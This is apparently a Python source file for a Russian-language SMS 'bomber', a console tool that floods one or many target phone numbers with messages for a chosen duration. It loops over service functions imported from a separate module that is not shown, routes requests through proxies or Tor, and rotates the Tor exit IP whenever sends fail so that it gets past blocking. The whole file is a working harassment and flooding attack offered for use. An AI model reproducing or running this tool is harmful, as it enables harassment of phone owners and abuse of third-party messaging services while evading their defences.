from stem import Signal
from stem.control import Controller
from typing import List
import colorama as clr
import requests
import json
import time
import os
import module
import attck_funcs


def clear_screen():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


class Main:
    proxy = {}

    def __init__(self):
        self.session = requests.session()
        with open("settings.json") as file:
            self.settings = json.loads(file.read())
        self.refresh_proxy()

    def logo(self):
        clear_screen()
        print(module.logo)

    def main_menu(self):
        while True:
            self.logo()
            print(module.main_menu)
            cmd = input(" >")
            if cmd == "1":
                self.attack_menu()
                # print("Attack menu")
            elif cmd == "2":
                self.proxy_menu()
            elif cmd == "0":
                clear_screen()
                quit()
            else:
                print(clr.Fore.RED + " Некоректный ввод." + clr.Fore.BLUE)
                time.sleep(1.25)

    def attack_menu(self):
        while True:
            self.logo()
            print(module.attack_menu)
            cmd = input(" >")
            if cmd == "1":
                self.logo()
                phones = [input(" Введите номер: ").replace(" ", "")]
                raw_time = input(" Введите время атаки(мин:сек): ").split(":")
                time_ = int(raw_time[0]) * 60 + int(raw_time[1])

                # Attack
                print("\n Номер телефона для атаки:")
                print(" [1]: " + phones[0])
                answer = input("\n" + " Вы хотите запустить атаку? (1 - Да, 2 - По таймеру, 3 - Нет): ")

                if answer == "1":
                    self.attack(phones, time_)
                elif answer == "2":
                    wait_time_raw = input("\n Через сколько запустить спам (мин:секунды): ").split(":")
                    wait_time = int(wait_time_raw[0]) * 60 + int(wait_time_raw[1])

                    timer = int(time.time())
                    last_val = int(time.time()) - timer

                    print("")
                    while int(time.time()) - timer < wait_time:
                        if last_val != int(time.time()) - timer:
                            last_val = int(time.time()) - timer
                            print(" Осталось: " + str(wait_time - last_val))
                    self.attack(phones, time_)
                elif answer == "3":
                    pass
                else:
                    print(clr.Fore.RED + " Некоректный ввод." + clr.Fore.BLUE)
                    time.sleep(1.25)

            elif cmd == "2":
                self.logo()
                raw_phones = input(" Введите номера(через пробел): ").split(" ")
                phones: List[str] = []
                for phone in raw_phones:
                    phone = phone.replace(" ", "")
                    if phone != "":
                        phones.append(phone)

                raw_time = input(" Введите время атаки(мин:сек): ").split(":")
                time_ = int(raw_time[0]) * 60 + int(raw_time[1])

                # Attack
                print("\n Номера телефонов для атаки:")
                for i in range(len(phones)):
                    print(" [" + str(i + 1) + "]: " + phones[i])
                answer = input("\n" + " Вы хотите запустить атаку? (1 - Да, 2 - По таймеру, 3 - Нет): ")
                if answer == "1":
                    self.attack(phones, time_)
                elif answer == "2":
                    wait_time_raw = input("\n Через сколько запустить спам (мин:секунды): ").split(":")
                    wait_time = int(wait_time_raw[0]) * 60 + int(wait_time_raw[1])

                    timer = int(time.time())
                    last_val = int(time.time()) - timer

                    print("")
                    while int(time.time()) - timer < wait_time:
                        if last_val != int(time.time()) - timer:
                            last_val = int(time.time()) - timer
                            print(" Осталось: " + str(wait_time - last_val))
                    self.attack(phones, time_)
            elif cmd == "3":
                self.logo()
                phones: List[str] = []

                while True:
                    file_path = input(" Введите путь к файлу: ")
                    try:
                        with open(file_path, "r") as file:
                            raw_phones = file.read().split("\n")
                        break
                    except FileNotFoundError or FileExistsError:
                        print(clr.Fore.RED + " Файл не существует или не найден." + clr.Fore.BLUE)
                        time.sleep(1.25)

                for phone in raw_phones:
                    phone = phone.replace(" ", "")
                    if phone != "":
                        phones.append(phone)

                raw_time = input(" Введите время атаки(мин:сек): ").split(":")
                time_ = int(raw_time[0]) * 60 + int(raw_time[1])

                # Attack
                print("\n Номера телефонов для атаки:")
                for i in range(len(phones)):
                    print(" [" + str(i + 1) + "]: " + phones[i])

                answer = input("\n" + " Вы хотите запустить атаку? (1 - Да, 2 - По таймеру, 3 - Нет): ")
                if answer == "1":
                    self.attack(phones, time_)
                elif answer == "2":
                    wait_time_raw = input("\n Через сколько запустить спам (мин:секунды): ").split(":")
                    wait_time = int(wait_time_raw[0]) * 60 + int(wait_time_raw[1])

                    timer = int(time.time())
                    last_val = int(time.time()) - timer

                    print("")
                    while int(time.time()) - timer < wait_time:
                        if last_val != int(time.time()) - timer:
                            last_val = int(time.time()) - timer
                            print(" Осталось: " + str(wait_time - last_val))
                    self.attack(phones, time_)

            elif cmd == "0":
                break
            else:
                print(clr.Fore.RED + " Некоректный ввод." + clr.Fore.BLUE)
                time.sleep(1.25)
                continue

    def proxy_menu(self):
        while True:
            self.logo()
            selected_symbol = clr.Fore.LIGHTBLUE_EX + "+" + clr.Fore.CYAN
            proxy_arr = [" ", " ", " ", " "]
            if self.settings['proxy'] == "noproxy":
                proxy_arr[0] = selected_symbol
            elif self.settings['proxy'] == "proxy":
                proxy_arr[1] = selected_symbol
            elif self.settings['proxy'] == "tor":
                proxy_arr[2] = selected_symbol
            elif self.settings['proxy'] == "toripcng":
                proxy_arr[3] = selected_symbol
            print(module.proxy_menu.format(proxy_arr[0],
                                           proxy_arr[1],
                                           proxy_arr[2],
                                           proxy_arr[3]))

            cmd = input(" >")
            if cmd == "1":
                self.settings['proxy'] = "noproxy"
            elif cmd == "2":
                proxy = input("\n Введите прокси (ip:port): ")
                self.settings['proxy'] = "proxy"
                self.settings['custom_proxy'] = "https://" + proxy
            elif cmd == "3":
                self.settings['proxy'] = "tor"
            elif cmd == "4":
                self.settings['proxy'] = "toripcng"
            elif cmd == "0":
                break
            else:
                print(clr.Fore.RED + " Некоректный ввод." + clr.Fore.BLUE)
                time.sleep(1.25)
                continue

            with open("settings.json", "w") as file:
                json.dump(self.settings, file)
            self.refresh_proxy()

    def new_ip(self):
        # signal TOR for a new connection
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password="password")
            controller.signal(Signal.NEWNYM)

    def refresh_proxy(self):
        if self.settings['proxy'] == "noproxy":
            self.proxy = {}
        elif self.settings['proxy'] == "proxy":
            self.proxy = {'https': self.settings['custom_proxy']}
        elif self.settings['proxy'] == "tor" or self.settings['proxy'] == "toripcng":
            self.proxy = {'http':  'socks5://127.0.0.1:9050',
                          'https': 'socks5://127.0.0.1:9050'}

    def attack(self, phones: List[str], time_: int = 30):
        clear_screen()
        print(module.attack_logo + "\n\n")
        timer = time.time()
        try:
            while time.time() - timer < time_:
                for phone in phones:
                    error = False
                    print(clr.Fore.LIGHTBLUE_EX + f"\n {phone}:" + clr.Fore.CYAN)
                    for service in attck_funcs.functions:
                        name = attck_funcs.names[attck_funcs.functions.index(service)]
                        resp = service(phone, self.proxy)
                        if resp == "ok":
                            print(clr.Fore.LIGHTGREEN_EX + " [" + name + "] Сообщение отправленно." + clr.Fore.CYAN)
                        elif resp == "error":
                            print(clr.Fore.LIGHTRED_EX + " [" + name + "] Сообщение не отправленно." + clr.Fore.CYAN)
                            error = True

                    if error and self.settings["proxy"] == "toripcng":
                        print("\a\n\n Changing ip")
                        old_ip = json.loads(requests.get("http://httpbin.org/ip", proxies=self.proxy).content)["origin"]
                        print(" Old ip: " + old_ip)
                        self.new_ip()
                        new_ip = json.loads(requests.get("http://httpbin.org/ip", proxies=self.proxy).content)["origin"]
                        print(" New ip: " + new_ip)
        except KeyboardInterrupt:
            print("\a\n\n Атака остановленна.")
            time.sleep(2.5)
        except Exception as E:
            print(E)
            time.sleep(12.5)


if __name__ == '__main__':
    app = Main()
    app.main_menu()
